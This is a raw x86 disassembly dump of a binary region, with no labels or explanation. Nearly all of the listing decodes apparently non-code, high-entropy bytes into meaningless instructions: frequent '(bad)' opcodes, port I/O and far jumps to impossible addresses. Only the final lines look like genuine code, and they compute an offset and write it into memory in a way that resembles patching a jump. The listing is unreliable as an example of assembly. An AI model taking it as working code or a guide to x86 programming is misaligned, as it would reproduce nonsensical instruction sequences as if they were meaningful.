  403099:	test   BYTE PTR [ebx],ah
  40309b:	cdq    
  40309c:	test   eax,0x817b1bc9
  4030a1:	push   ebp
  4030a3:	ins    DWORD PTR es:[edi],dx
  4030a4:	jl     0x4030cf
  4030a6:	jo     0x40305d
  4030a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030a9:	leave  
  4030aa:	mov    al,0xaf
  4030ac:	or     DWORD PTR [edi+0x49],0x17
  4030b0:	fdiv   DWORD PTR [edi+0x68]
  4030b3:	mov    al,ds:0xf12f2c82
  4030b8:	jge    0x4030db
  4030ba:	add    DWORD PTR [ebx],esi
  4030bc:	mov    eax,0x33b52193
  4030c1:	push   0xffffffff
  4030c3:	jns    0x4030aa
  4030c5:	sbb    esp,DWORD PTR [edi+ebx*4]
  4030c8:	inc    ebx
  4030c9:	mov    ah,0xa9
  4030cb:	test   al,0xdc
  4030cd:	push   cs
  4030ce:	scas   al,BYTE PTR es:[edi]
  4030cf:	push   esp
  4030d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030d1:	push   eax
  4030d2:	or     al,0xc6
  4030d4:	fs cdq 
  4030d6:	sub    ecx,DWORD PTR [ebx+0x0]
  4030d9:	in     al,0x8c
  4030db:	mov    ds:0xe634d092,eax
  4030e0:	jmp    0x4030ac
  4030e2:	push   ebx
  4030e3:	int3   
  4030e4:	xchg   BYTE PTR [edi],ah
  4030e6:	jb     0x403122
  4030e8:	cli    
  4030e9:	loopne 0x4030f4
  4030eb:	cwde   
  4030ec:	mov    al,ds:0x4aa30cdb
  4030f1:	repnz data16 sub al,0xd3
  4030f5:	mov    ah,0x28
  4030f7:	lahf   
  4030f8:	fsubr  st(3),st
  4030fa:	loope  0x4030e7
  4030fc:	fidivr DWORD PTR [edx+ecx*2-0x19f1f3a4]
  403103:	ins    BYTE PTR es:[edi],dx
  403104:	fsub   st,st(3)
  403106:	xchg   edi,eax
  403107:	cdq    
  403108:	jae    0x4030f7
  40310a:	cwde   
  40310b:	fs mov ah,0x62
  40310e:	mov    ebx,gs
  403110:	pop    ecx
  403111:	enter  0xe0e2,0xa1
  403115:	outs   dx,DWORD PTR ds:[esi]
  403116:	leave  
  403117:	aad    0xb1
  403119:	fisttp WORD PTR [ebx-0x43d12f1b]
  40311f:	mov    ah,0xd6
  403121:	or     BYTE PTR [ebx-0x1732c7b2],bh
  403127:	in     al,dx
  403128:	leave  
  403129:	mov    al,ds:0x2d22c4a6
  40312e:	stos   DWORD PTR es:[edi],eax
  40312f:	sub    eax,0x3357e959
  403134:	repnz test eax,0xb2277242
  40313a:	test   eax,0x8b40615f
  40313f:	jno    0x403164
  403141:	jle    0x403142
  403143:	stc    
  403144:	arpl   WORD PTR [edx-0x3f147be9],ax
  40314a:	push   cs
  40314b:	adc    eax,0x734700fc
  403150:	push   ss
  403151:	repz push ss
  403153:	mov    dl,0x8
  403155:	ds xchg esi,eax
  403157:	(bad)
  40315a:	cli    
  40315b:	cdq    
  40315c:	es cmp bl,al
  40315f:	mov    cl,0xb8
  403161:	sar    DWORD PTR [ebp+0x6e],cl
  403164:	sbb    DWORD PTR [ecx-0x1deb0ac6],eax
  40316a:	jnp    0x40315d
  40316c:	add    al,BYTE PTR [ebx-0x6b9c27df]
  403172:	imul   edx,ebp,0x4c
  403175:	mov    cl,0xa3
  403177:	mov    bh,al
  403179:	jge    0x40314d
  40317b:	sub    ah,BYTE PTR [esp+ebp*8-0x4a5e86f6]
  403182:	sbb    DWORD PTR [eax+0x3b30e788],ecx
  403188:	xchg   esp,eax
  403189:	xor    al,0xc0
  40318b:	inc    esi
  40318c:	jae    0x4031cc
  40318e:	add    esp,eax
  403190:	xlat   BYTE PTR cs:[ebx]
  403192:	ins    DWORD PTR es:[edi],dx
  403193:	inc    eax
  403194:	outs   dx,BYTE PTR ds:[esi]
  403195:	(bad)  
  403196:	daa    
  403197:	jns    0x4031f1
  403199:	out    dx,eax
  40319a:	push   ebp
  40319b:	sbb    ebp,ebx
  40319d:	push   ecx
  40319e:	inc    ecx
  40319f:	cmp    BYTE PTR gs:[edi-0x1],bl
  4031a3:	pop    edi
  4031a4:	mov    ah,0x33
  4031a6:	shr    BYTE PTR [eax-0x9a69c12],1
  4031ac:	sbb    ah,BYTE PTR [ecx-0x55e3c1af]
  4031b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031b3:	jno    0x403135
  4031b5:	ror    esi,cl
  4031b7:	cmp    BYTE PTR [ebx+0x5a],0x84
  4031bb:	jp     0x403235
  4031bd:	adc    edi,DWORD PTR fs:[edx]
  4031c0:	jg     0x403175
  4031c2:	pop    edi
  4031c3:	cmp    edx,DWORD PTR [ebx]
  4031c5:	push   ds
  4031c6:	loopne 0x4031a2
  4031c8:	xor    ch,BYTE PTR [edx-0x6d]
  4031cb:	shl    edx,cl
  4031cd:	push   ss
  4031ce:	dec    ecx
  4031cf:	stc    
  4031d0:	arpl   WORD PTR [esi],bp
  4031d2:	sbb    BYTE PTR [esi+0x7538f9e8],0x1c
  4031d9:	dec    edx
  4031da:	mov    ebx,0x95e7ef84
  4031df:	sub    DWORD PTR ds:0x85c16f1,eax
  4031e5:	popa   
  4031e6:	sti    
  4031e7:	add    BYTE PTR ds:0xe56c09c6,bh
  4031ed:	mov    bh,0x56
  4031ef:	pushf  
  4031f0:	xchg   ebx,eax
  4031f1:	push   esp
  4031f2:	je     0x403215
  4031f4:	aas    
  4031f5:	mov    WORD PTR [ebx+0x5e],fs
  4031f8:	cmc    
  4031f9:	mov    ds:0x2bcf56a2,al
  4031fe:	pop    ebx
  4031ff:	mov    ah,0xad
  403201:	jmp    0x403241
  403203:	push   cs
  403204:	dec    edi
  403205:	adc    BYTE PTR [eax+0x47f2a7f5],dh
  40320b:	adc    dl,BYTE PTR [ecx-0x4e216eff]
  403211:	adc    DWORD PTR [eax+edx*2-0x1ba72ebf],ebx
  403218:	xchg   DWORD PTR [eax-0x4c],ebp
  40321b:	int    0x11
  40321d:	xchg   edi,eax
  40321e:	cli    
  40321f:	loopne 0x403274
  403221:	lods   al,BYTE PTR ds:[esi]
  403222:	repnz or BYTE PTR [ecx],bl
  403225:	mov    esi,0xddb9d455
  40322b:	sub    edi,DWORD PTR ds:0xee0d532e
  403231:	call   0x91f3:0xd171f1fa
  403238:	sbb    eax,0xea0f7a55
  40323d:	fstp   DWORD PTR [edx]
  40323f:	cmp    al,ah
  403241:	addr16 add eax,0x980b10d1
  403247:	or     esp,0x74d2855
  40324d:	outs   dx,DWORD PTR ds:[esi]
  40324e:	jp     0x403266
  403250:	adc    cl,ch
  403252:	jb     0x403256
  403254:	rcr    BYTE PTR [ecx],1
  403256:	in     al,0x4f
  403258:	mov    ds:0xc370ff4b,al
  40325d:	xor    eax,DWORD PTR [esi+0x9976fbc]
  403263:	pop    es
  403264:	test   DWORD PTR [eax+0x42b71cbb],ecx
  40326a:	xor    BYTE PTR [edi],0xb3
  40326d:	and    al,0x63
  40326f:	out    dx,al
  403270:	inc    esp
  403271:	pop    ebx
  403272:	das    
  403273:	out    0x50,al
  403275:	pop    edx
  403276:	jae    0x4032ce
  403278:	in     eax,dx
  403279:	mov    ebx,DWORD PTR [edi+0x36]
  40327c:	jmp    0x4032c6
  40327e:	jno    0x403223
  403280:	js     0x403256
  403282:	lods   al,BYTE PTR ds:[esi]
  403283:	inc    ebx
  403284:	js     0x4032d0
  403286:	scas   al,BYTE PTR es:[edi]
  403287:	push   esi
  403288:	cs fwait
  40328a:	mov    ch,0x65
  40328c:	push   0xa5faeb42
  403291:	mov    esi,0x8fbeb893
  403296:	fisubr WORD PTR [eax-0x49dc9f48]
  40329c:	mov    eax,0x91d061f0
  4032a1:	pop    eax
  4032a2:	or     ebp,DWORD PTR [ebx+0x7b6da502]
  4032a8:	xor    eax,0x355bc3c9
  4032ad:	pop    esi
  4032ae:	lds    ebx,FWORD PTR es:[ebp+0x7f93a9f3]
  4032b5:	push   edx
  4032b6:	repz push edx
  4032b8:	test   eax,0x62c72dde
  4032bd:	mov    edi,0xa46c4573
  4032c2:	lods   al,BYTE PTR ds:[esi]
  4032c3:	retf   
  4032c4:	push   ss
  4032c5:	aaa    
  4032c6:	xchg   esp,eax
  4032c7:	jne    0x403337
  4032c9:	sbb    al,0xc7
  4032cb:	mov    esi,0x4aed2717
  4032d0:	cmp    al,0x0
  4032d2:	and    eax,0x47926030
  4032d7:	sbb    eax,0x3579a7e8
  4032dc:	sbb    edi,esi
  4032de:	inc    esi
  4032df:	stc    
  4032e0:	jne    0x403360
  4032e2:	(bad)  [ebx+0x5ee410fa]
  4032e8:	mov    al,0x6b
  4032ea:	pop    dx
  4032ec:	ja     0x40330c
  4032ee:	shl    BYTE PTR [ecx-0x67088370],1
  4032f4:	adc    al,0x72
  4032f6:	mov    ebx,0xca876e71
  4032fb:	cmp    BYTE PTR [edi],ch
  4032fd:	push   0xffffffbe
  4032ff:	and    eax,0xe788c48b
  403304:	mov    edx,0x756d19cf
  403309:	jnp    0x4032a6
  40330b:	fst    DWORD PTR [edx]
  40330d:	sub    dh,BYTE PTR [ebx+0x61]
  403310:	(bad)  
  403311:	pop    esp
  403312:	lds    eax,FWORD PTR ds:0x23226b62
  403318:	in     al,0x4a
  40331a:	add    DWORD PTR [eax],edi
  40331c:	jl     0x40332f
  40331e:	inc    edx
  40331f:	mov    WORD PTR [eax],ds
  403321:	aaa    
  403322:	cs sub al,0x6b
  403325:	mov    dl,0xbd
  403327:	(bad)  
  403328:	fnsave es:[esi-0x4e15a141]
  40332f:	inc    edx
  403330:	fdivr  QWORD PTR ds:0x4ab7f29e
  403336:	mov    BYTE PTR [eax],bh
  403338:	lahf   
  403339:	retf   0xd9c0
  40333c:	push   ss
  40333d:	(bad)  
  40333e:	lds    ecx,FWORD PTR [edi]
  403340:	xor    al,0x9d
  403342:	rol    dl,0x72
  403345:	les    esp,FWORD PTR [eax]
  403347:	stos   DWORD PTR es:[edi],eax
  403348:	hlt    
  403349:	sbb    al,0x87
  40334b:	xchg   BYTE PTR [edx+esi*4+0x7557742d],al
  403352:	ret    0x5e9d
  403355:	data16 (bad) 
  403357:	adc    al,0x3e
  403359:	add    al,BYTE PTR [edi+edx*8-0x5d]
  40335d:	cmp    ch,BYTE PTR [esi+0x42e3032c]
  403363:	xchg   ebx,eax
  403364:	cmc    
  403365:	cli    
  403366:	dec    ebp
  403367:	adc    eax,0xb0402c99
  40336c:	pop    ecx
  40336d:	push   ecx
  40336e:	popf   
  40336f:	adc    dh,ch
  403371:	lahf   
  403372:	ss leave 
  403374:	mov    ch,0x9e
  403376:	ins    BYTE PTR es:[edi],dx
  403377:	out    0x88,eax
  403379:	in     al,0xb4
  40337b:	pop    ds
  40337c:	lock ficom DWORD PTR [ecx+0x46]
  403380:	pop    ebp
  403381:	sbb    eax,eax
  403383:	xor    BYTE PTR [ebp-0x4a],ch
  403386:	(bad)  
  403387:	dec    esp
  403388:	inc    edx
  403389:	(bad)  
  40338a:	xchg   ebx,eax
  40338b:	bound  edx,QWORD PTR [esi+0x19]
  40338e:	dec    edx
  40338f:	sub    edi,DWORD PTR [ebp+0x42bce26b]
  403395:	mov    ds:0xc084e937,al
  40339a:	sbb    DWORD PTR [ebx+0x7c],ebx
  40339d:	push   ecx
  40339e:	ja     0x40336e
  4033a0:	jge    0x40339b
  4033a2:	je     0x4033b5
  4033a4:	out    dx,al
  4033a5:	(bad)  
  4033a6:	xchg   esp,eax
  4033a7:	pop    edx
  4033a8:	or     eax,0x81929f5f
  4033ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ae:	ja     0x40340e
  4033b0:	das    
  4033b1:	and    al,BYTE PTR [ebx+0x28]
  4033b4:	xchg   ecx,eax
  4033b5:	hlt    
  4033b6:	dec    edi
  4033b7:	pop    eax
  4033b8:	ror    dl,cl
  4033ba:	rcr    DWORD PTR [esi],1
  4033bc:	fs loopne 0x403426
  4033bf:	ja     0x403360
  4033c1:	leave  
  4033c2:	xchg   ebx,eax
  4033c3:	mov    WORD PTR [edx+0x71d43795],ds
  4033c9:	xor    dh,cl
  4033cb:	xchg   esp,eax
  4033cc:	mov    esp,0x42409e6a
  4033d1:	je     0x403409
  4033d3:	dec    ebp
  4033d4:	cmp    eax,0x1e9307e8
  4033d9:	outs   dx,BYTE PTR ds:[esi]
  4033da:	ss xchg edi,eax
  4033dc:	dec    esi
  4033dd:	mov    bh,dh
  4033df:	outs   dx,BYTE PTR ds:[esi]
  4033e0:	dec    edx
  4033e1:	gs ins BYTE PTR es:[edi],dx
  4033e3:	adc    BYTE PTR [ebx],dl
  4033e5:	push   ecx
  4033e6:	sub    DWORD PTR [ebx],edx
  4033e8:	in     al,dx
  4033e9:	pop    edx
  4033ea:	and    edi,DWORD PTR [eax]
  4033ec:	sub    BYTE PTR [bx+di+0x3234],ah
  4033f1:	xchg   edx,eax
  4033f2:	lea    edi,[ebx]
  4033f4:	out    dx,eax
  4033f5:	adc    al,0x22
  4033f7:	mov    ds,esp
  4033f9:	stos   BYTE PTR es:[edi],al
  4033fa:	mov    bh,0x41
  4033fc:	ficom  WORD PTR [esi]
  4033fe:	jns    0x40338c
  403400:	push   edi
  403401:	push   ebp
  403402:	cmp    ebx,esp
  403404:	les    esp,FWORD PTR [edi]
  403406:	xlat   BYTE PTR ds:[ebx]
  403407:	xchg   ebx,eax
  403408:	js     0x4033eb
  40340a:	cmp    BYTE PTR [ecx],ch
  40340c:	fstp   DWORD PTR fs:0xe791f292
  403413:	push   ds
  403414:	fcomp  DWORD PTR [edi]
  403416:	addr16 (bad) 
  403418:	push   eax
  403419:	pushf  
  40341a:	imul   esi,DWORD PTR [ebx-0x9b1d644],0xa3116609
  403424:	call   0xe9e2379f
  403429:	jne    0x403471
  40342b:	sbb    BYTE PTR [edi],al
  40342d:	(bad)
  403432:	push   ebx
  403433:	cmp    eax,DWORD PTR [ebp-0x45cc076a]
  403439:	ret    0xbe2b
  40343c:	push   bx
  40343e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40343f:	and    eax,eax
  403441:	or     DWORD PTR ds:0x3706d23c,esi
  403447:	pushf  
  403448:	cdq    
  403449:	ja     0x403410
  40344b:	adc    eax,0xf1309291
  403450:	ds aaa 
  403452:	sub    BYTE PTR [esi+ecx*2+0x1e],dh
  403456:	pop    esp
  403457:	mov    edi,0x95d0f852
  40345c:	enter  0x658b,0x88
  403460:	(bad)  
  403461:	and    eax,0x58b7eb53
  403466:	xor    BYTE PTR [ebx-0x6b4e5724],0xc8
  40346d:	data16 xor ch,ch
  403470:	xchg   ebx,eax
  403471:	mov    cl,BYTE PTR [edi+0x109e0bdd]
  403477:	aas    
  403478:	pop    ss
  403479:	iret   
  40347a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40347b:	cs push ecx
  40347d:	retf   
  40347e:	cld    
  40347f:	adc    BYTE PTR [edi+eax*8+0x7e3ed02f],cl
  403486:	mov    bh,0xcd
  403488:	inc    ecx
  403489:	loope  0x4034b7
  40348b:	nop
  40348c:	aad    0x45
  40348e:	aam    0x2a
  403490:	inc    edi
  403491:	adc    BYTE PTR [ebx+0x144d8ac3],cl
  403497:	sub    cl,ch
  403499:	cmp    al,0x4b
  40349b:	(bad)  
  40349c:	sbb    dl,BYTE PTR [edi-0x73bf41b5]
  4034a2:	mov    ebx,0x616194ff
  4034a7:	shr    DWORD PTR [ebx+0x589d7cde],cl
  4034ad:	mov    ebx,edi
  4034af:	and    al,0xe9
  4034b1:	sub    eax,0xb66c8981
  4034b6:	xor    dh,0xa0
  4034b9:	xchg   edi,eax
  4034ba:	push   ebx
  4034bb:	adc    BYTE PTR [edx+0x6f367567],ah
  4034c1:	cmp    al,BYTE PTR [edi]
  4034c3:	inc    eax
  4034c4:	sub    cl,cl
  4034c6:	js     0x4034c2
  4034c8:	inc    dh
  4034ca:	cmp    edx,DWORD PTR [ecx-0x27f85468]
  4034d0:	push   cs
  4034d1:	aad    0x14
  4034d3:	repz popa 
  4034d5:	xor    ebx,DWORD PTR [eax-0x61]
  4034d8:	cmp    eax,0xecdc52cc
  4034dd:	jp     0x40353b
  4034df:	stos   DWORD PTR es:[edi],eax
  4034e0:	jbe    0x40353c
  4034e2:	mov    ch,0xf2
  4034e4:	std    
  4034e5:	xchg   esi,eax
  4034e6:	clc    
  4034e7:	cwde   
  4034e8:	cmp    BYTE PTR [esi+eax*4-0x49],cl
  4034ec:	or     BYTE PTR [ebx-0x10099f2c],ch
  4034f2:	push   eax
  4034f3:	repz cmp DWORD PTR [edx+ebp*4],0xffffffda
  4034f8:	mov    ebp,0xa4e1fe3e
  4034fd:	dec    edi
  4034fe:	(bad)  
  4034ff:	push   esp
  403500:	pop    eax
  403501:	cdq    
  403502:	out    dx,eax
  403503:	jne    0x403584
  403505:	inc    esi
  403506:	inc    edx
  403507:	push   edi
  403508:	loope  0x40350a
  40350a:	mov    ss,WORD PTR [ecx]
  40350c:	lahf   
  40350d:	inc    ecx
  40350e:	mov    ecx,ds
  403510:	outs   dx,DWORD PTR ds:[esi]
  403511:	inc    esi
  403512:	xchg   edx,eax
  403513:	dec    ecx
  403514:	and    al,0xc
  403516:	or     al,0x3f
  403518:	mov    WORD PTR [eax-0x64],cs
  40351b:	push   esi
  40351c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40351d:	mov    esi,0xc0bb0bfe
  403522:	fild   DWORD PTR [edx]
  403524:	imul   eax,DWORD PTR ds:0x61f90a0,0xffffff83
  40352b:	cld    
  40352c:	int    0x47
  40352e:	fwait
  40352f:	xor    ebx,DWORD PTR [edi+esi*8]
  403532:	pop    ebx
  403533:	loope  0x4034e1
  403535:	xchg   esi,eax
  403536:	call   0xc52:0xa9280f59
  40353d:	leave  
  40353e:	loope  0x403597
  403540:	mov    edx,0x3ac3a12d
  403545:	sub    edx,DWORD PTR [edx]
  403547:	mov    ds:0x7b58e2ef,al
  40354c:	jmp    0x4dc9:0xacb69cb1
  403553:	cli    
  403554:	sub    cl,BYTE PTR [eax+0x7]
  403557:	and    bh,BYTE PTR [edi]
  403559:	push   0x422f17f1
  40355e:	test   al,0x5
  403560:	add    DWORD PTR [edx+0x38],esi
  403563:	repnz dec eax
  403565:	and    eax,DWORD PTR [edx]
  403567:	fisub  WORD PTR [esi+0x1b369b0]
  40356d:	dec    ebp
  40356e:	loop   0x403525
  403570:	shr    BYTE PTR [eax+0x47],0x3e
  403574:	adc    al,0xb1
  403576:	xor    dl,cl
  403578:	fwait
  403579:	cmp    eax,0xc2024603
  40357e:	add    DWORD PTR [eax],ecx
  403580:	push   ds
  403581:	sub    dh,al
  403583:	mov    DWORD PTR [ecx+ebp*4+0x5e2d3c6f],0xa916f2cc
  40358e:	push   ecx
  40358f:	mov    ebp,0x451f11eb
  403594:	stc    
  403595:	aad    0x49
  403597:	adc    DWORD PTR [ebp-0xd801e3b],ecx
  40359d:	(bad)  
  40359e:	addr16 mov bl,0xc0
  4035a1:	js     0x4035d6
  4035a3:	out    0xb7,eax
  4035a5:	mov    BYTE PTR [ecx-0x6e],dh
  4035a8:	stos   BYTE PTR es:[edi],al
  4035a9:	cdq    
  4035aa:	xor    al,0x2a
  4035ac:	jbe    0x40355e
  4035ae:	cmp    eax,0xf9ee36af
  4035b3:	pop    ebx
  4035b4:	or     eax,0x745981ac
  4035b9:	call   0xfae6590b
  4035be:	push   cs
  4035bf:	and    DWORD PTR [edi+0x1c0711ae],edx
  4035c5:	daa    
  4035c6:	mov    edi,0xbe45bf21
  4035cb:	sub    BYTE PTR [edx+0x480e205e],bl
  4035d1:	in     eax,dx
  4035d2:	retf   0xbe91
  4035d5:	pop    esi
  4035d6:	pushf  
  4035d7:	xor    eax,0xa320d33e
  4035dc:	aad    0x54
  4035de:	lahf   
  4035df:	sbb    al,0xca
  4035e1:	cmp    BYTE PTR [ebx-0x5e4a4d1a],bh
  4035e7:	iret   
  4035e8:	sub    dl,BYTE PTR [ecx]
  4035ea:	gs mov eax,0xf01dbe6d
  4035f0:	int3   
  4035f1:	mov    fs,WORD PTR [edx-0x4895394c]
  4035f7:	ret    0xef91
  4035fa:	jp     0x4035ab
  4035fc:	mov    ch,0xdb
  4035fe:	repnz ds cli 
  403601:	fsubrp st(0),st
  403603:	mov    es,WORD PTR [ecx+0x75]
  403606:	ds cmp eax,0x2f78c4f3
  40360c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40360d:	cli    
  40360e:	mov    esp,0x2cb347de
  403613:	cdq    
  403614:	nop
  403615:	in     al,0xfe
  403617:	jl     0x403698
  403619:	into   
  40361a:	int3   
  40361b:	push   ebx
  40361c:	push   edx
  40361d:	loope  0x403676
  40361f:	jmp    0x403676
  403621:	adc    eax,0xc2922adf
  403626:	push   0x21c23b11
  40362b:	ret    
  40362c:	sub    DWORD PTR [edx+0x2f140268],0x5e8e6acf
  403636:	mov    bh,0xea
  403638:	aaa    
  403639:	ret    0x5fd0
  40363c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40363d:	xor    BYTE PTR [edx-0x3d52ef64],al
  403643:	xchg   edi,eax
  403644:	mov    eax,ds:0x88f126
  403649:	mov    dl,0x12
  40364b:	bound  eax,QWORD PTR [ebx-0xf3dbabf]
  403651:	icebp  
  403652:	jecxz  0x40361b
  403654:	pop    esp
  403655:	push   ecx
  403656:	and    eax,0x4bcda51c
  40365b:	inc    ebp
  40365c:	sbb    DWORD PTR [eax],ecx
  40365e:	sahf   
  40365f:	push   eax
  403660:	das    
  403661:	pop    esi
  403662:	jmp    0xd9399df
  403667:	and    eax,0x3c4a87e2
  40366c:	loope  0x40366e
  40366e:	adc    DWORD PTR [edx],ebp
  403670:	(bad)  
  403672:	(bad)  
  403673:	mov    dh,0xa0
  403675:	ficomp DWORD PTR [ecx]
  403677:	jne    0x40360f
  403679:	aas    
  40367a:	(bad)  
  40367b:	xor    BYTE PTR [ecx-0x2a37c6f6],0x8
  403682:	sar    BYTE PTR [ebx+edx*1+0x1b],1
  403686:	fimul  WORD PTR [edx-0x47]
  403689:	imul   esp,DWORD PTR [edi+0x2dcc7d2e],0x3993db3f
  403693:	test   DWORD PTR [esi-0x5e],ebp
  403696:	test   al,0xf7
  403698:	mov    edx,ebp
  40369a:	gs push es
  40369c:	push   edx
  40369d:	(bad)  
  40369e:	fstp   QWORD PTR [esi+0x19]
  4036a1:	sub    BYTE PTR ds:0x29742e22,dl
  4036a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036a8:	repz inc ebp
  4036aa:	scas   eax,DWORD PTR es:[edi]
  4036ab:	std    
  4036ac:	in     eax,0x56
  4036ae:	xchg   esi,eax
  4036af:	fisub  DWORD PTR [edi-0x38]
  4036b2:	cmp    DWORD PTR [esi+0x72],ebx
  4036b5:	mov    bh,dl
  4036b7:	mov    eax,0x90c2d51
  4036bc:	popa   
  4036bd:	fldcw  WORD PTR [ecx+ebp*1-0x1a]
  4036c1:	push   cs
  4036c2:	add    BYTE PTR [eax+eiz*8],0xfc
  4036c6:	add    esp,esi
  4036c8:	lods   eax,DWORD PTR ds:[esi]
  4036c9:	jmp    0x63c6ad44
  4036ce:	ret    0x7885
  4036d1:	cmc    
  4036d2:	fdiv   DWORD PTR [ecx+ecx*2]
  4036d5:	sub    eax,0x6463cd5a
  4036da:	loop   0x403721
  4036dc:	push   cs
  4036dd:	dec    ecx
  4036de:	fild   DWORD PTR [eax-0x733a1a66]
  4036e4:	mov    ds:0x8bfed149,eax
  4036e9:	sub    ecx,eax
  4036eb:	sbb    eax,ebx
  4036ed:	adc    al,0x3f
  4036ef:	imul   edi,DWORD PTR [eax-0x1bd21c43],0x25
  4036f6:	sub    esp,DWORD PTR [edi]
  4036f8:	sub    DWORD PTR [ecx],ecx
  4036fa:	sbb    al,0xbb
  4036fc:	dec    si
  4036fe:	jns    0x403745
  403700:	sar    DWORD PTR [ecx-0x4353fe3b],1
  403706:	(bad)  
  403707:	repnz pop es
  403709:	fiadd  WORD PTR ds:0x1ef645b1
  40370f:	sahf   
  403710:	pop    esp
  403711:	jns    0x403758
  403713:	aad    0xc9
  403715:	inc    ebp
  403716:	cdq    
  403717:	sti    
  403718:	leave  
  403719:	(bad)  
  40371a:	das    
  40371b:	dec    edx
  40371c:	enter  0xa317,0xc2
  403720:	les    esi,FWORD PTR [ebx-0x72e7cd6f]
  403726:	mov    bl,BYTE PTR [esi]
  403728:	jmp    0xf75d:0x5bf8127b
  40372f:	cmp    eax,0x8bdaba01
  403734:	jmp    0x8de6b1b3
  403739:	call   0xdeb758fb
  40373e:	add    eax,0x1d10c4bd
  403743:	and    eax,0x31394b05
  403748:	(bad)  
  403749:	les    ebp,FWORD PTR es:[ebp-0xd9e4192]
  403750:	(bad)  
  403751:	int3   
  403752:	jae    0x40378e
  403754:	push   es
  403755:	dec    ebx
  403756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403757:	(bad)  
  403758:	pop    eax
  403759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40375a:	pop    ebp
  40375b:	mov    ebp,0x801d8bf4
  403760:	jg     0x403781
  403762:	ins    DWORD PTR es:[edi],dx
  403763:	xchg   esi,eax
  403764:	sub    dl,BYTE PTR [ebp-0x1e]
  403767:	in     al,dx
  403768:	mov    ds:0x5b889d1a,al
  40376d:	push   eax
  40376e:	sbb    eax,0xaeed5b5b
  403773:	pop    esp
  403774:	cmp    ah,BYTE PTR [esi+0x6d1e804b]
  40377a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40377b:	inc    esi
  40377c:	(bad)  
  40377d:	out    dx,al
  40377e:	xor    eax,0x9fb2e2cc
  403783:	cli    
  403784:	pop    es
  403785:	retf   0x3838
  403788:	mov    ds:0xab2f64c,al
  40378d:	pop    ss
  40378e:	jmp    0xcac86b1a
  403793:	cld    
  403794:	stos   DWORD PTR es:[edi],eax
  403795:	retf   0x6d05
  403798:	cmp    al,0x1f
  40379a:	scas   al,BYTE PTR es:[edi]
  40379b:	xchg   edx,eax
  40379c:	push   ebp
  40379d:	pop    es
  40379e:	mov    eax,ds:0x1ad89b66
  4037a3:	adc    edx,eax
  4037a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037a6:	pop    ebx
  4037a7:	sub    BYTE PTR [eax-0x453f03dc],bh
  4037ad:	daa    
  4037ae:	test   DWORD PTR [esi-0x9],esp
  4037b1:	xor    DWORD PTR [edi-0xcc9a0e7],eax
  4037b7:	sbb    ah,0x9f
  4037ba:	idiv   BYTE PTR [eax-0x14]
  4037bd:	call   0xba19261
  4037c2:	jge    0x403810
  4037c4:	xchg   edi,eax
  4037c5:	pop    esi
  4037c6:	pop    edx
  4037c7:	push   esp
  4037c8:	mov    ch,0x20
  4037ca:	or     eax,0xe579cdf0
  4037cf:	dec    eax
  4037d0:	icebp  
  4037d1:	xor    al,0x9d
  4037d3:	push   cs
  4037d4:	mov    ebp,0x364ad146
  4037d9:	outs   dx,DWORD PTR ds:[esi]
  4037da:	mov    bh,0x87
  4037dc:	(bad)  
  4037dd:	jp     0x4037bd
  4037df:	add    al,0xe2
  4037e1:	fs (bad) 
  4037e3:	sbb    bl,ch
  4037e5:	repz aas 
  4037e7:	sub    BYTE PTR [ecx-0x46],dh
  4037ea:	retf   0x9f38
  4037ed:	mov    al,0xe8
  4037ef:	outs   dx,DWORD PTR ds:[esi]
  4037f0:	jbe    0x4037f3
  4037f2:	add    BYTE PTR [ebp+0x2b840fc0],al
  4037f8:	add    BYTE PTR [eax],al
  4037fa:	add    BYTE PTR [ebp-0x8f7b],cl
  403800:	call   DWORD PTR [eax-0x75]
  403803:	inc    ebp
  403804:	shl    BYTE PTR [ebx],1
  403806:	mov    BYTE PTR [ebx],0xc7
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
